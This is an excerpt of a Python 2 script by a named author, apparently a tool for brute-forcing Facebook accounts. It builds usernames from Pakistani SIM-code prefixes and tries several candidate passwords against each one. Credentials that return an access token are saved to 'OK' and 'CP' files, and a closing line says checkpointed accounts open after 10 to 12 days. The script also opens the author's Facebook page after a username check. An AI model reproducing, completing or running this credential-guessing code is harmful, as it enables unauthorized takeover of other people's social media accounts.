...
__author__ = 'MARUF'
__copyright = 'All rights reserved . MD.MARUF '
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
            ...
            time.sleep(1)
            os.system('xdg-open https://www.facebook.com/nalzi.sk')
            os.system('clear')
            loop = 'false'
    else:
...
\033[1;97m--------------------------------------------------
\033[1;91m Author      :  MD. MARUF
\033[1;94m GitHub      : https://github.com/noobmaruf
\033[1;96m LOVEðŸ™ˆ    :  I LAVE MY Family 
\033[1;92m FACEBOOK     :  Blank ID ( MD.MARUF )
\033[1;91m VERSOIN   : ________
\033[1;97m--------------------------------------------------
                                                 """
logo1 = '     \n\n\x1b[4;96mSELECT PAK  SIM CODE \x1b[1;0m\n\x1b[1;91m[1] Love   \x1b[1;92m 00,01,02,03,04,05,06,07,08\n\x1b[1;94m[2] Love   \x1b[1;92m 11,12,13,14,15,16,17\n\x1b[1;92m[3] Hate   \x1b[1;96m 21,22,23,24,25\n\x1b[1;91m[4] Hate   \x1b[1;94m 30,31,32,33,34,35\n\x1b[1;96m[5] Love2 \x1b[1;97m 40,41,42,43,44,45,46,47\n\n\n\n\x1bx \x1b[1;97m\x1b[1;0m\n'
back = 0
berhasil = []
cekpoint = []
oks = []
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;94m  [MARUF_OK]  ' + k + c + user + '  ^  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m  [MARUF_CP] ' + k + c + user + '  ^  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [MARUF_OK] ' + k + c + user + '  ^  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;95m  [MARUF_CP] ' + k + c + user + '  ^  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m  [MARUF_OK]  ' + k + c + user + '  ^  ' + pass3
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [MARUF_CP] ' + k + c + user + '  ^  ' + pass3
                        cps = open('save/CP.txt', 'a')
    ...
    jalan('Note : Cp account  10 Thaka 12 days Por OPEN Korta hoba')
